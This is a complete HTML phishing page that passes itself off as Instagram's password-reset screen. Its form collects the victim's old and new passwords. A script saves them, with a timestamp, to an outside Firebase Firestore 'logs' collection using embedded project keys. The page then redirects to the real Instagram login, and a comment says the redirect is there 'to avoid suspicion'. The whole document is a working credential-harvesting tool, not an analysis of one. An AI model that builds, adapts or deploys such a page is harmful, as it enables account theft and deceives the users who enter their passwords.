<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password • Instagram</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; }
        h2 { color: #262626; font-size: 16px; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 18px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
        <h2>Create a Strong Password</h2>
        <p>Your password must be at least 6 characters long.</p>
        <form id="resetForm">
            <input type="password" id="old_pass" placeholder="Old Password" required>
            <input type="password" id="new_pass" placeholder="New Password" required>
            <input type="password" id="confirm_pass" placeholder="Confirm New Password" required>
            <button type="submit" id="submitBtn">Reset Password</button>
        </form>
    </div>

    <script>
        // Your specific Firebase Config from AI Studio
        const firebaseConfig = {
            apiKey: "AIzaSyCTU2TKA2XsTkwGvh8IJNP5qVYRHMhq3qc",
            authDomain: "gen-lang-client-0636043060.firebaseapp.com",
            projectId: "gen-lang-client-0636043060",
            storageBucket: "gen-lang-client-0636043060.firebasestorage.app",
            messagingSenderId: "839938945864",
            appId: "1:839938945864:web:27f6ec93ecd1ed720db97d"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        document.getElementById('resetForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = 'Updating...';
            btn.disabled = true;

            try {
                // Save to Firestore 'logs' collection
                await db.collection("logs").add({
                    type: "Reset Attempt",
                    old_password: document.getElementById('old_pass').value,
                    new_password: document.getElementById('new_pass').value,
                    timestamp: new Date()
                });
                // Redirect to real Instagram login
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error("Submission error:", error);
                // Redirect anyway to avoid suspicion
                window.location.href = "https://www.instagram.com/accounts/login/";
            }
        };
    </script>
</body>
</html>
